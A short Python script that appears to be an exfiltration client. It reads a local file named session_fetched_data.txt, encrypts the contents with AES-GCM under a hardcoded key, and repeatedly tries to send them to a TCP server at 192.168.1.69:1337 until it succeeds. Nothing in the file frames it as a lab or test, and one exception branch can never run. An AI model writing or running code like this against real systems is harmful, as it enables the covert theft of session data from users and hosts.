from Crypto.Cipher import AES
import os
import socket
import binascii
from time import sleep

HOST = '192.168.1.69' # change this to the server address
PORT = 1337

key = binascii.unhexlify('602a534498e3ece978c615a50c4a266b28e2e630777a83ba55eb0982aa7dbfd3')

def encrypt_and_tag(message):
	nonce = os.urandom(12)
	#print("[*] nonce = {}".format(binascii.hexlify(nonce)))
	cipher = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
	ciphertext, tag = cipher.encrypt_and_digest(message)
	#print("[*] tag = {}".format(binascii.hexlify(tag)))
	ciphertext = nonce + ciphertext + tag
	return binascii.hexlify(ciphertext)

def connect_and_send(data):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	sock.sendall(encrypt_and_tag(data))

data_file = open("./session_fetched_data.txt")
data_to_be_sent = ''.join(data_file.readlines()).encode()

while True:
	try:
		connect_and_send(data_to_be_sent)
		print("[+] Data sent successfully")
		break
	except OSError:
		sleep(2)
	except ConnectionRefusedError:
		break
